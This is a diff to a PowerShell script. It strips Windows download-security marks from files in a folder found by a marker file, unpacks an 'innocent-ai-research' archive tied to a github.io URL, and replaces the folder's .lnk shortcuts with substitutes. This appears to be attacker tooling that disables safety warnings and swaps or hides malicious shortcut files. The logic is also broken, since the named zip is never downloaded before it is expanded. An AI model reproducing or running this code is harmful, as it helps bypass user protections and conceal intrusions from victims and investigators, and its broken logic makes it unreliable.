@@ -105,6 +105,24 @@ try {
     $unzipDir = Get-ChildItem -Path $env:USERPROFILE -Recurse -Filter "ai_research_8973479hdfj674.txt" | Select-Object -ExpandProperty DirectoryName
     Get-ChildItem -Path $unzipDir -Recurse -File | Unblock-File -ErrorAction SilentlyContinue
 
+if (Test-Path $unzipDir) {
+        Write-Host "Unblocking LNK files ..."
+        Get-ChildItem -Path $unzipDir -Recurse -File | Unblock-File -ErrorAction SilentlyContinue
+    }
+
+    $innocentZip = "http://nature-cursive.github.io/AI/innocent-ai-research.zip"
+    $innocentZipName = "innocent_temp.zip"
+    $innocentZipPath = Join-Path $env:TEMP $innocentZipName
+    $extractedInnocent = "$env:TEMP\InnocentLNK"
+
+    Expand-Archive -Path $innocentZipPath -DestinationPath $extractedInnocent -Force
+
+    if (Test-Path $unzipDir) {
+        Get-ChildItem -Path $unzipDir -Filter *.lnk | Remove-Item -Force
+        Copy-Item -Path "$extractedInnocent\*.lnk" -Destination $unzipDir -Force
+        Write-Host "Replacement done ---"
+    }
+
 
 
 } finally {
